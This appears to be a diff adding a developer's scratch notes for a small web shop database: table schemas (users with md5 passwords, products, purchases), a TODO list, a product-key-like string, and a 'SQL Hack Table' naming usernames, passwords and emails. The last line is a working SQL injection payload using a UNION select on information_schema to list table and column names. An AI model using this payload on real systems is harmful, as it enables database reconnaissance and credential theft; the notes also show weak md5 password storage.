@@ -1,0 +1,41 @@
+1645.39, Jan 1, 2018
+1318.76
+V66NQ-4YDF6-FGVYV-VR3QB-K764M
+
+Product Table
+ProductID, int Primary key
+ProductName, Varchar 30
+ProductPicture, TEXT
+ProductPrice, float
+
+User Table
+CustomerID, int primary key
+Username, Varchar 20 -unique
+Password, Varchar 32 -md5
+Email, Varchar 50
+
+//TODO
+
+Update modal
+ -need a select function for single record
+ -use id to grab info
+ -prefill info in modal
+
+build purchase queries
+- requirement is only to grab 
+
+Purchase Table
+CustomerID 
+Items
+Cost
+Date 
+
+
+SQL Hack Table
+Username
+Password (md5)
+Email
+
+
+%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns
+
